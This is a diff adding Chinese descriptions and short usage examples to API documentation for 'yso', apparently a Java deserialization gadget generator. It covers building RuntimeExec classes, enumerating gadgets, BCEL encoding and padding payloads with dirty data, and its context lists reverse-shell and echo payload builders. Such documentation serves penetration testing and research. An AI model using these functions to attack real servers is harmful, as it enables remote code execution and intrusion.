@@ -2,7 +2,7 @@
 
 |函数名|函数描述/介绍|
 |:------|:--------|
-| [yso.GenerateClass](#generateclass) ||
+| [yso.GenerateClass](#generateclass) |GenerateClass 根据提供的配置选项生成一个Java类对象。  这个函数是生成各种类型Java类对象的核心函数，它可以处理原始字节码类型和预定义的类模板。  对于原始字节码类型(ClassRaw)，它直接解析提供的模板；对于其他类型，它从YsoConfigInstance中加载相应的类模板...|
 | [yso.GenerateClassObjectFromBytes](#generateclassobjectfrombytes) |GenerateClassObjectFromBytes 从字节数组中加载并返回一个javaclassparser.ClassObject对象。  LoadClassFromBytes、LoadClassFromBase64、LoadClassFromBCEL等函数都是基于这个函数实现的。  参数是...|
 | [yso.GenerateDNSlogEvilClassObject](#generatednslogevilclassobject) |GenDnslogClassObject  GenerateDnslogEvilClassObject 生成一个使用Dnslog类模板的javaclassparser.ClassObject对象，  并设置一个指定的 Dnslog 域名。这个函数结合使用 useDNSlogTemplate 和 dn...|
 | [yso.GenerateHeaderEchoClassObject](#generateheaderechoclassobject) |GenHeaderEchoClassObject  GenerateHeaderEchoClassObject 生成一个使用HeaderEcho类模板的javaclassparser.ClassObject对象，  options：一组可选的GenClassOptionFun函数，用于进一步定制生成...|
@@ -16,7 +16,7 @@
 | [yso.GenerateTcpReverseEvilClassObject](#generatetcpreverseevilclassobject) |GenTcpReverseClassObject  GenerateTcpReverseEvilClassObject 生成一个使用TcpReverse类模板的javaclassparser.ClassObject对象，  这个函数结合使用 useTcpReverseTemplate ，tcpRev...|
 | [yso.GenerateTcpReverseShellEvilClassObject](#generatetcpreverseshellevilclassobject) |GenTcpReverseShellClassObject  GenerateTcpReverseShellEvilClassObject 生成一个使用TcpReverseShell类模板的javaclassparser.ClassObject对象，  这个函数结合使用 useTcpReverseS...|
 | [yso.GenerateTomcatEchoClassObject](#generatetomcatechoclassobject) |GenTomcatEchoClassObject  GenerateTomcatEchoEvilClassObject 生成一个使用TomcatEcho类模板的javaclassparser.ClassObject对象，  options：一组可选的GenClassOptionFun函数，用于进一步...|
-| [yso.GetAllGadget](#getallgadget) ||
+| [yso.GetAllGadget](#getallgadget) |GetAllGadget 获取所有支持的Java反序列化Gadget。  这个函数会遍历所有已配置的Gadget，并为每个Gadget创建对应的生成函数。  对于支持模板实现的Gadget，会创建一个接受GenClassOptionFun参数的函数；  对于不支持模板实现的Gadget，会创建一个接...|
 | [yso.GetAllRuntimeExecGadget](#getallruntimeexecgadget) |GetAllRuntimeExecGadget 获取所有的支持的RuntimeExecGadget，可用于爆破 gadget  |
 | [yso.GetAllTemplatesGadget](#getalltemplatesgadget) |GetAllTemplatesGadget 获取所有支持模板的Gadget，可用于爆破 gadget  |
 | [yso.GetBeanShell1JavaObject](#getbeanshell1javaobject) |GetBeanShell1JavaObject 基于BeanShell1 序列化模板生成并返回一个Java对象。  它首先解析预定义的BeanShell1序列化模板，然后在解析出的第一个Java对象中替换预设的占位符为传入的命令字符串。  cmd：要传入Java对象的命令字符串。  返回：成功时返回...|
@@ -38,7 +38,7 @@
 | [yso.GetCommonsCollectionsK4JavaObject](#getcommonscollectionsk4javaobject) |GetCommonsCollectionsK4JavaObject 基于Commons Collections K4 序列化模板生成并返回一个Java对象。  这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。  cmd：要设置在Java对象中的命令字符串。  返回：成功时返...|
 | [yso.GetFindGadgetByDNSJavaObject](#getfindgadgetbydnsjavaobject) |GetFindGadgetByDNSJavaObject 通过 DNSLOG 探测 CLass Name，进而探测 Gadget。  使用预定义的FindGadgetByDNS序列化模板，然后在序列化对象中替换预设的URL占位符为提供的URL字符串。  url：要在生成的Java对象中设置的URL字...|
 | [yso.GetGadget](#getgadget) |GenerateGadget this is a highly flexible function that can generate a Java object by three different ways:   1. Generate a Java object that have no an...|
-| [yso.GetGadgetNameByFun](#getgadgetnamebyfun) ||
+| [yso.GetGadgetNameByFun](#getgadgetnamebyfun) |GetGadgetNameByFun 从函数指针获取 gadget 名称，通过解析函数名来提取。  函数名需要符合 &amp;#34;Get*JavaObject&amp;#34; 格式，返回中间的 * 部分作为 gadget 名称  |
 | [yso.GetGroovy1JavaObject](#getgroovy1javaobject) |GetGroovy1JavaObject 基于Groovy1 序列化模板生成并返回一个Java对象。  这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。  cmd：要设置在Java对象中的命令字符串。  返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应...|
 | [yso.GetJBossInterceptors1JavaObject](#getjbossinterceptors1javaobject) |GetJBossInterceptors1JavaObject 基于JBossInterceptors1 序列化模板生成并返回一个Java对象。  通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。  这些函数使用户能够定制生成的J...|
 | [yso.GetJSON1JavaObject](#getjson1javaobject) |GetJSON1JavaObject 基于JSON1 序列化模板生成并返回一个Java对象。  通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。  这些函数使用户能够定制生成的Java对象的特定属性或行为。  options：用于...|
@@ -51,11 +51,11 @@
 | [yso.LoadClassFromBCEL](#loadclassfrombcel) |LoadClassFromBCEL 将BCEL（Byte Code Engineering Library）格式的Java类数据转换为字节数组，  并从这些字节中加载并返回一个javaclassparser.ClassObject对象。  这个函数首先使用javaclassparser.Bcel2b...|
 | [yso.LoadClassFromBase64](#loadclassfrombase64) |LoadClassFromBase64 从base64编码的字符串中加载并返回一个javaclassparser.ClassObject对象。  这个函数使用GenerateClassObjectFromBytes作为其实现，并允许通过可变参数`options`来配置生成的类对象。  这些参数是Ge...|
 | [yso.LoadClassFromBytes](#loadclassfrombytes) |LoadClassFromBytes 从字节数组中加载并返回一个javaclassparser.ClassObject对象。  这个函数使用GenerateClassObjectFromBytes作为其实现，并允许通过可变参数`options`来配置生成的类对象。  这些参数是GenClassOpt...|
-| [yso.ToBcel](#tobcel) ||
+| [yso.ToBcel](#tobcel) |ToBcel 将 Java 类对象转换为 BCEL 编码格式的字符串  |
 | [yso.ToBytes](#tobytes) |ToBytes 将 Java 或反序列化对象转换为字节码  |
 | [yso.ToJson](#tojson) |ToJson 将 Java 或反序列化对象转换为 json 字符串  |
 | [yso.command](#command) |SetExecCommand  command 请求参数选项函数，用于设置要执行的命令。需要配合 useRuntimeExecTemplate 使用。  |
-| [yso.dirtyDataLength](#dirtydatalength) ||
+| [yso.dirtyDataLength](#dirtydatalength) |SetToBytesDirtyDataLength 设置序列化数据中脏数据的长度  length: 要设置的脏数据长度  |
 | [yso.dnslogDomain](#dnslogdomain) |SetDnslog  dnslogDomain 请求参数选项函数，设置指定的 Dnslog 域名，需要配合 useDnslogTemplate 使用。  addr：要设置的 Dnslog 域名。  |
 | [yso.dump](#dump) |dump 将Java 对象转换为类 Java 代码  |
 | [yso.evilClassName](#evilclassname) |SetClassName  evilClassName 请求参数选项函数，用于设置生成的类名。  className：要设置的类名。  |
@@ -74,7 +74,7 @@
 | [yso.useBytesClass](#usebytesclass) |SetClassBytes  useBytesClass 请求参数选项函数，传入字节码。  data：字节码。  |
 | [yso.useBytesEvilClass](#usebytesevilclass) |SetBytesEvilClass  useBytesEvilClass 请求参数选项函数，传入自定义的字节码。  data：自定义的字节码。  |
 | [yso.useClassMultiEchoTemplate](#useclassmultiechotemplate) ||
-| [yso.useClassParam](#useclassparam) ||
+| [yso.useClassParam](#useclassparam) |SetClassParam 设置类生成时的参数  k: 参数名  v: 参数值  |
 | [yso.useConstructorExecutor](#useconstructorexecutor) ||
 | [yso.useDNSLogEvilClass](#usednslogevilclass) |SetDnslogEvilClass  useDnslogEvilClass 请求参数选项函数，设置生成Dnslog类的模板，同时设置指定的 Dnslog 域名。  addr：要设置的 Dnslog 域名。  |
 | [yso.useDNSlogTemplate](#usednslogtemplate) ||
@@ -99,7 +99,7 @@
 | [yso.useTcpReverseShellEvilClass](#usetcpreverseshellevilclass) |SetTcpReverseShellEvilClass  useTcpReverseShellEvilClass 请求参数选项函数，设置生成TcpReverseShell类的模板，同时设置指定的 tcpReverseShellHost ，tcpReverseShellPort。  相当于 useTc...|
 | [yso.useTcpReverseShellTemplate](#usetcpreverseshelltemplate) ||
 | [yso.useTcpReverseTemplate](#usetcpreversetemplate) ||
-| [yso.useTemplate](#usetemplate) ||
+| [yso.useTemplate](#usetemplate) |SetClassType 设置要生成的类类型  t: 类类型  |
 | [yso.useTomcatEchoEvilClass](#usetomcatechoevilclass) ||
 | [yso.useTomcatEchoTemplate](#usetomcatechotemplate) ||
 
@@ -108,6 +108,24 @@
 ### GenerateClass
 
 #### 详细描述
+GenerateClass 根据提供的配置选项生成一个Java类对象。
+
+这个函数是生成各种类型Java类对象的核心函数，它可以处理原始字节码类型和预定义的类模板。
+
+对于原始字节码类型(ClassRaw)，它直接解析提供的模板；对于其他类型，它从YsoConfigInstance中加载相应的类模板并应用参数。
+
+options：一组GenClassOptionFun函数，用于配置生成的类对象的各种属性。
+
+返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
+
+Example:
+```
+// 使用原始字节码生成类对象
+classObj, err := yso.GenerateClass(yso.SetClassBytes(bytecode))
+
+// 使用预定义模板生成类对象
+classObj, err := yso.GenerateClass(yso.SetClassType(ClassRuntimeExec), yso.SetExecCommand("whoami"))
+```
 
 
 #### 定义
@@ -615,6 +633,32 @@ headerClassObj,_ = yso.GenerateTomcatEchoEvilClassObject(yso.useHeaderParam("Ech
 ### GetAllGadget
 
 #### 详细描述
+GetAllGadget 获取所有支持的Java反序列化Gadget。
+
+这个函数会遍历所有已配置的Gadget，并为每个Gadget创建对应的生成函数。
+
+对于支持模板实现的Gadget，会创建一个接受GenClassOptionFun参数的函数；
+
+对于不支持模板实现的Gadget，会创建一个接受命令字符串参数的函数。
+
+返回：包含所有Gadget生成函数的接口切片。
+
+Example:
+```
+allGadgets := yso.GetAllGadget()
+
+	for _, gadget := range allGadgets {
+	    switch g := gadget.(type) {
+	    case func(...GenClassOptionFun) (*JavaObject, error):
+	        // 处理模板实现的Gadget
+	        obj, err := g(yso.useRuntimeExecEvilClass("whoami"))
+	    case func(string) (*JavaObject, error):
+	        // 处理命令执行类型的Gadget
+	        obj, err := g("whoami")
+	    }
+	}
+
+```
 
 
 #### 定义
@@ -1474,6 +1518,15 @@ GenerateGadget this is a highly flexible function that can generate a Java objec
 ### GetGadgetNameByFun
 
 #### 详细描述
+GetGadgetNameByFun 从函数指针获取 gadget 名称，通过解析函数名来提取。
+
+函数名需要符合 &#34;Get*JavaObject&#34; 格式，返回中间的 * 部分作为 gadget 名称
+
+Example:
+```
+name, err := GetGadgetNameByFun(GetCommonsBeanutils1JavaObject)
+// name = "CommonsBeanutils1"
+```
 
 
 #### 定义
@@ -1983,6 +2036,13 @@ classObject, _ := yso.LoadClassFromBytes(bytesCode) // 从字节中加载并配�
 ### ToBcel
 
 #### 详细描述
+ToBcel 将 Java 类对象转换为 BCEL 编码格式的字符串
+
+Example:
+```
+classObj := &javaclassparser.ClassObject{...}
+bcelStr, err := yso.ToBcel(classObj)
+```
 
 
 #### 定义
@@ -2089,6 +2149,14 @@ yso.GetCommonsBeanutils1JavaObject(yso.command("whoami"),yso.useRuntimeExecTempl
 ### dirtyDataLength
 
 #### 详细描述
+SetToBytesDirtyDataLength 设置序列化数据中脏数据的长度
+
+length: 要设置的脏数据长度
+
+Example:
+```
+gadgetBytes,_ = yso.ToBytes(gadgetObj,yso.dirtyDataLength(10000))
+```
 
 
 #### 定义
@@ -2534,6 +2602,16 @@ gadgetObj,err = yso.GetCommonsBeanutils1JavaObject(yso.useBytesEvilClass(bytesCo
 ### useClassParam
 
 #### 详细描述
+SetClassParam 设置类生成时的参数
+
+k: 参数名
+
+v: 参数值
+
+Example:
+```
+classObj,_ = yso.GenerateClass(yso.useClassParam("command","whoami"))
+```
 
 
 #### 定义
@@ -2991,6 +3069,14 @@ yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseShellEvilClass(host,8080))
 ### useTemplate
 
 #### 详细描述
+SetClassType 设置要生成的类类型
+
+t: 类类型
+
+Example:
+```
+classObj,_ = yso.GenerateClass(yso.useTemplate("RuntimeExec"))
+```
 
 
 #### 定义
